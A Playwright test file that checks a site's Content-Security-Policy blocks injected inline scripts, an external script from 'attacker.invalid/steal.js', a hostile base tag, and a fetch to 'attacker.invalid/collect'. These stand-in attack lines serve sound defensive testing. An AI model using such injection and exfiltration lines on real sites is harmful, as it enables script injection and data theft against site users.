const { test, expect } = require('@playwright/test');
const { apiBase } = require('../static/portfolio/sync-config.json');

for (const path of ['/', '/portfolio/']) {
    test(`CSP protects ${path} against injected scripts and unexpected destinations`, async ({ page }) => {
        await page.addInitScript(() => {
            window.policyViolations = [];
            document.addEventListener('securitypolicyviolation', event => {
                window.policyViolations.push(event.effectiveDirective);
            });
        });
        await page.goto(path);
        const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
        expect(policy).toContain("script-src 'self' 'wasm-unsafe-eval'");
        expect(policy).not.toMatch(/script-src[^;]*'unsafe-(?:inline|eval)'/);
        expect(policy).toContain(apiBase);
        expect(await page.evaluate(() => window.policyViolations)).toEqual([]);
        await page.evaluate(async () => {
            const script = document.createElement('script');
            script.textContent = 'window.injectedScriptRan = true';
            document.body.append(script);
            const external = document.createElement('script');
            external.src = 'https://attacker.invalid/steal.js';
            document.body.append(external);
            const base = document.createElement('base');
            base.href = 'https://attacker.invalid/';
            document.head.append(base);
            await fetch('https://attacker.invalid/collect').catch(() => {});
        });
        expect(await page.evaluate(() => window.injectedScriptRan)).toBeUndefined();
        expect(await page.evaluate(() => document.baseURI)).toContain('127.0.0.1:3090');
        await expect.poll(() => page.evaluate(() => window.policyViolations)).toEqual(expect.arrayContaining([
            'script-src-elem', 'connect-src', 'base-uri'
        ]));
    });
}
